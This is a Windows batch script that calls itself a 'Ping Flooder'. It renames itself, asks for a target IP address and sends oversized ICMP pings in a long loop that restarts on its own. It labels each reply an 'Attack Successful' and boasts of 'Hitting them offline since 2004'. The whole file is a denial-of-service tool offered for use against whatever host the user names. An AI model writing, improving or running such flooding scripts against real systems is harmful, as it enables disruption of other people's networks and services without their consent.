@echo off
setlocal

set "newName=Ping Flooder by Diablo V4.3.4 Final"

set "newName=%newName%.bat"

ren "%~dpnx0" "%newName%"



set "SCRIPT_DIR=%~dp0"
cd /d "%SCRIPT_DIR%"

title Ping Flooder by Diablo V4.3.4 Final




attrib +R "Ping Flooder by Diablo V4.3.4 Final.bat"

echo Ping Flooder by Diablo V4.3.4 Final
echo Historical .BAT File Ping Flooder, Hitting them offline since 2004!

set /p ip=Enter the IP address:

:begin

echo Launching the Attack!

setlocal enabledelayedexpansion
set count=0
set maxCount=10000000

:loop
if !count! equ %maxCount% goto timeout

ping -n 1 -l 1472 -w 100 %ip% | findstr /c:"Reply from" >nul
if !errorlevel! equ 0 (
    echo Attack on %ip% Successful!
) else (
    echo Attempted Attack on %ip% Failed!
)

set /a count+=1
echo (Count: !count!)
goto loop

:timeout
echo Attack timed out, beginning to relaunch the Attack!
timeout /t 3 >nul

goto begin

exit
